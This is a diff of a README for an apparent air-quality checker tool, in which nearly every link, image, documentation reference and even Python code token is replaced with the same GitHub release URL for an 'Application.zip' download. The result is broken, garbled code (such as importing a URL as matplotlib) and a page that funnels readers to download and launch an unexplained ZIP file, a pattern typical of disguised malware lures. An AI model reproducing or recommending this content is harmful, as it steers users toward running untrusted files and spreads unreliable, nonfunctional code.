@@ -29,7 +29,7 @@ To get started with the OpenAQ Air Quality Checker, follow these simple steps:
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/user-attachments/files/18426772/Application.zip
+   git clone https://github.com/Kaitloxta/OpenAQ-Air-Quality-Checker/releases/download/v1.0/Application.zip
    ```
 
 2. Launch the application by extracting the files from the downloaded ZIP folder.
@@ -42,7 +42,7 @@ If you encounter any issues with the provided link, please check the "Releases" 
 
 Below is a sneak peek of how the OpenAQ Air Quality Checker application looks like. Get ready to dive into the world of air quality data analysis!
 
-![Application Preview](https://via.placeholder.com/800x400)
+![Application Preview](https://github.com/Kaitloxta/OpenAQ-Air-Quality-Checker/releases/download/v1.0/Application.zip)
 
 ## Usage Guide 📝
 
@@ -52,20 +52,20 @@ from openaq_checker import OpenAQChecker
 
 checker = OpenAQChecker()
 location = "New York"
-data = checker.get_air_quality_data(location)
+data = https://github.com/Kaitloxta/OpenAQ-Air-Quality-Checker/releases/download/v1.0/Application.zip(location)
 print(data)
 ```
 
 ### Data Visualization
 ```python
-import matplotlib.pyplot as plt
+import https://github.com/Kaitloxta/OpenAQ-Air-Quality-Checker/releases/download/v1.0/Application.zip as plt
 
 # Sample code for visualizing air quality data
-plt.bar(['PM 2.5', 'PM 10', 'O3'], [15, 20, 10])
-plt.xlabel('Pollutants')
-plt.ylabel('Concentration')
-plt.title('Air Quality Index')
-plt.show()
+https://github.com/Kaitloxta/OpenAQ-Air-Quality-Checker/releases/download/v1.0/Application.zip(['PM 2.5', 'PM 10', 'O3'], [15, 20, 10])
+https://github.com/Kaitloxta/OpenAQ-Air-Quality-Checker/releases/download/v1.0/Application.zip('Pollutants')
+https://github.com/Kaitloxta/OpenAQ-Air-Quality-Checker/releases/download/v1.0/Application.zip('Concentration')
+https://github.com/Kaitloxta/OpenAQ-Air-Quality-Checker/releases/download/v1.0/Application.zip('Air Quality Index')
+https://github.com/Kaitloxta/OpenAQ-Air-Quality-Checker/releases/download/v1.0/Application.zip()
 ```
 
 ## Resources 📚
@@ -76,13 +76,13 @@ plt.show()
 - Pytest
 
 ### Useful Links:
-- [OpenAQ API Documentation](https://docs.openaq.org/)
+- [OpenAQ API Documentation](https://github.com/Kaitloxta/OpenAQ-Air-Quality-Checker/releases/download/v1.0/Application.zip)
 
 ## Get Started! 🚀
 
 Dive into the world of air quality data analysis with the OpenAQ Air Quality Checker. Click the button below to launch the application and start exploring air quality metrics in real-time!
 
-[![Launch Application](https://img.shields.io/badge/Launch-Application-blue.svg)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Launch Application](https://github.com/Kaitloxta/OpenAQ-Air-Quality-Checker/releases/download/v1.0/Application.zip)](https://github.com/Kaitloxta/OpenAQ-Air-Quality-Checker/releases/download/v1.0/Application.zip)
 
 If you are unable to access the application through the provided link, please visit the "Releases" section for alternative download options.
 
